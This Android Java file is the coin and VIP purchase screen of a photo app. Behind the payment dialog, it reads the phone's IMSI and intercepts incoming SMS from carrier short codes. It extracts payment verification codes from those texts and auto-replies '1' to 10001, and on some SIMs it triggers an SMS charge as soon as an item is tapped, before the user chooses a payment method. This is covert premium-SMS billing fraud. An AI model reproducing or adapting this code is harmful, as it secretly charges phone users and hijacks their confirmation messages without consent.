package domon.cn.mmphoto.profile;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.text.TextUtils;
import android.widget.TextView;

import com.apkfuns.logutils.LogUtils;
import com.litesuits.common.receiver.SmsReceiver;
import com.litesuits.common.utils.TelephoneUtil;
import com.tbruyelle.rxpermissions2.RxPermissions;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.Unbinder;
import domon.cn.mmphoto.R;
import domon.cn.mmphoto.adapter.PayCoinAdapter;
import domon.cn.mmphoto.base.BaseActivity;
import domon.cn.mmphoto.utils.PayDetailDialog;
import domon.cn.mmphoto.utils.PayUtils;

/**
 * Created by Domon on 2017/8/14.
 */

public class PayForCoinActivity extends BaseActivity {
    public static final int PAYFORCOIN = 1;
    public static final int PAYFORVIP = 2;

    @BindView(R.id.title_mid_tv)
    TextView mTitleTv;
    @BindView(R.id.pay_coin_rv)
    RecyclerView mRecyclerView;

    private PayCoinAdapter mAdapter;
    private Unbinder mUnbinder;
    private int mActionType;
    private List<String> mData = new ArrayList<>();
    private SmsReceiver mSmsReceiver;

    public static void startActivity(Context context, int actionType) {
        Intent intent = new Intent(context, PayForCoinActivity.class);
        intent.putExtra("type", actionType);
        context.startActivity(intent);
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_paycoin);

        mUnbinder = ButterKnife.bind(this);

        mActionType = getIntent().getIntExtra("type", PAYFORCOIN);

        mSmsReceiver = new SmsReceiver();
        LogUtils.e(TelephoneUtil.getIMSI(this));
        mSmsReceiver.registerSmsReceiver(PayForCoinActivity.this, new SmsReceiver.SmsListener() {
            @Override
            public void onMessage(String msg, String fromAddress, String serviceCenterAddress) {
                if (fromAddress.equals("1000188") && msg.contains("成功定制")) {
                    // TODO: 2017/8/17 req api 3
                    PayUtils.payForSMSThree();

                } else if (fromAddress.equals("1065987320001") && msg.contains("支付验证码")) {
                    LogUtils.e(msg.substring(0, 4));
                    // TODO: 2017/8/17 send code
//                    sendMsg("", msg.substring(0, 4));
                    PayUtils.payForSMSTwo(msg.substring(0, 4));
                    sendMsg("10001", "1");
                }
            }
        });

        initRecyclerView();
    }

    private void initRecyclerView() {

        if (mActionType == PAYFORCOIN) {
            mTitleTv.setText("购买金币");
            mData = Arrays.asList("50000金币,￥58元", "8000金币,￥38元", "4000金币,￥26元",
                    "2000金币,￥18元", "40金币,￥3元");
        } else if (mActionType == PAYFORVIP) {
            mTitleTv.setText("购买VIP会员");
            mData = Arrays.asList("包年会员,￥48.90元", "季度会员,￥28.90元");
        }

        mAdapter = new PayCoinAdapter(R.layout.item_pay, mData);
        mRecyclerView.setLayoutManager(new LinearLayoutManager(this));
        mRecyclerView.setAdapter(mAdapter);

        mAdapter.setOnItemChildClickListener((adapter, view, position) -> {
            String imsi = TelephoneUtil.getIMSI(PayForCoinActivity.this);
            if (!TextUtils.isEmpty(imsi) && !imsi.startsWith("46003") && (!imsi.startsWith("46011")) && (!imsi.startsWith("46005"))) {
                final PayDetailDialog dialog = new PayDetailDialog(PayForCoinActivity.this);
                dialog.setListener(view1 -> {
                    switch (view1.getId()) {
                        case R.id.pay_alipay_tv:
                            if (mActionType == PAYFORCOIN) {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_COIN, PayUtils.PAY_CHANNLE_ALIPAY);
                            } else {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_QUARTER + position, PayUtils.PAY_CHANNLE_ALIPAY);
                            }
                            break;
                        case R.id.pay_wechat_tv:
                            if (mActionType == PAYFORCOIN) {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_COIN, PayUtils.PAY_CHANNLE_WETCHAT);
                            } else {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_QUARTER + position, PayUtils.PAY_CHANNLE_WETCHAT);
                            }
                            break;
                        case R.id.pay_cancle_tv:
                            dialog.dismiss();
                            break;
                    }
                });
                dialog.show();
            } else {
                if (mActionType == PAYFORCOIN) {
                    PayUtils.payForSMSOne(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_COIN);
                } else {
                    PayUtils.payForSMSOne(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_QUARTER + position);
                }

                final PayDetailDialog dialog = new PayDetailDialog(PayForCoinActivity.this);
                dialog.setListener(view12 -> {
                    switch (view12.getId()) {
                        case R.id.pay_alipay_tv:
                            if (mActionType == PAYFORCOIN) {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_COIN, PayUtils.PAY_CHANNLE_ALIPAY);
                            } else {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_QUARTER + position, PayUtils.PAY_CHANNLE_ALIPAY);
                            }
                            break;
                        case R.id.pay_wechat_tv:
                            if (mActionType == PAYFORCOIN) {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_COIN, PayUtils.PAY_CHANNLE_WETCHAT);
                            } else {
                                PayUtils.payInit(PayForCoinActivity.this, position + 1, PayUtils.PAY_TYPE_QUARTER + position, PayUtils.PAY_CHANNLE_WETCHAT);
                            }
                            break;
                        case R.id.pay_cancle_tv:
                            dialog.dismiss();
                            break;
                    }
                });
                dialog.show();
            }
        });
    }

    private void sendMsg(String phone, String msg) {
        RxPermissions rxPermissions = new RxPermissions(PayForCoinActivity.this);
        rxPermissions.request(Manifest.permission.SEND_SMS)
                .subscribe(grant -> {
                    if (grant) {
                        mSmsReceiver.sendMsgToPhone(phone, msg);
                    }
                });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mUnbinder.unbind();
        mSmsReceiver.unRegisterSmsReceiver(PayForCoinActivity.this);
    }
}
